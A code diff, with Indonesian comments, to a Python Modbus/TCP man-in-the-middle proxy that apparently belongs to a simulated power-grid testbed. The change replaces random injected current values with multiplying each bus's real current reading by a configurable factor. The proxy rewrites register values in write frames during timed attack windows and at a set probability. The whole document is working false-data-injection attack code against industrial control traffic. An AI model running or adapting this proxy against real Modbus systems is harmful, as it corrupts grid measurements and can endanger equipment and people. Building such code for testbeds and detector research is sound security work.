@@ -14,11 +14,10 @@ MODBUS_PORT = 5020
 MITM_PROXY_PORT = 50201
 MITM_FIXED_SEED = 424242
 I_BASE_ADDR = 10
-# 29: arus max ~2259 A (65535/29); injeksi 1800–2200 A muat di register 16-bit.
 I_SCALE = 30
 NUM_BUS = 5
-I_INJECT_MIN_A = 1200.0
-I_INJECT_MAX_A = 1300.0
+# Perkalian terhadap I asli dari field/RTU (bukan nilai absolut).
+I_MANGLE_FACTOR = float(os.environ.get("MITM_I_FACTOR", "1.5"))
 # Mekanisme realistis: manipulasi hanya aktif pada jendela waktu tertentu,
 # lalu masih disaring probabilitas per-write.
 ATTACK_ON_SECONDS = 10.0
@@ -66,17 +65,13 @@ def _pop_modbus_tcp_frame(buf: bytearray) -> Optional[bytes]:
     del buf[:need]
     return frame
 
-def _fake_i_register_value() -> int:
-    """Satu nilai acak per panggilan; urutan tetap per run karena random.seed di main()."""
+def _mangle_i_register_value(i_orig_amp: float) -> int:
+    """I baru = I asli * I_MANGLE_FACTOR (dibatasi register 16-bit)."""
     reg_max = 65535
     amp_max = reg_max / float(I_SCALE)
-    lo = max(0.0, min(I_INJECT_MIN_A, amp_max))
-    hi = max(lo, min(I_INJECT_MAX_A, amp_max))
-    with _rng_lock:
-        if hi <= lo:
-            i_amp = amp_max
-        else:
-            i_amp = random.uniform(lo, hi)
+    factor = max(0.0, I_MANGLE_FACTOR)
+    i_amp = max(0.0, i_orig_amp) * factor
+    i_amp = min(amp_max, i_amp)
     val = int(round(i_amp * I_SCALE))
     return min(reg_max, max(0, val))
 
@@ -100,7 +95,7 @@ def _mangle_client_to_server(frame: bytes) -> bytes:
             bus = addr - I_BASE_ADDR + 1
             v_before = _v_cache_by_bus.get(bus)
             if _should_modify_now():
-                new_val = _fake_i_register_value()
+                new_val = _mangle_i_register_value(i_orig)
                 pdu[3] = (new_val >> 8) & 0xFF
                 pdu[4] = new_val & 0xFF
                 i_after = new_val / I_SCALE
@@ -129,7 +124,7 @@ def _mangle_client_to_server(frame: bytes) -> bytes:
                 bus = addr - I_BASE_ADDR + 1
                 v_before = _v_cache_by_bus.get(bus)
                 if _should_modify_now():
-                    new_val = _fake_i_register_value()
+                    new_val = _mangle_i_register_value(i_orig)
                     pdu[lo] = (new_val >> 8) & 0xFF
                     pdu[lo + 1] = new_val & 0xFF
                     i_after = new_val / I_SCALE
@@ -199,8 +194,9 @@ def main():
     ls.listen(32)
     print(
         f"[modbus-proxy] listen 0.0.0.0:{MITM_PROXY_PORT} -> {GATEWAY_IP}:{MODBUS_PORT} "
-        f"I regs {I_BASE_ADDR}..{I_BASE_ADDR + NUM_BUS - 1} fixed_seed={MITM_FIXED_SEED} "
-        f"on={ATTACK_ON_SECONDS}s off={ATTACK_OFF_SECONDS}s p={MODIFY_PROBABILITY}",
+        f"I regs {I_BASE_ADDR}..{I_BASE_ADDR + NUM_BUS - 1} factor={I_MANGLE_FACTOR} "
+        f"fixed_seed={MITM_FIXED_SEED} on={ATTACK_ON_SECONDS}s off={ATTACK_OFF_SECONDS}s "
+        f"p={MODIFY_PROBABILITY}",
         flush=True,
     )
     while True:
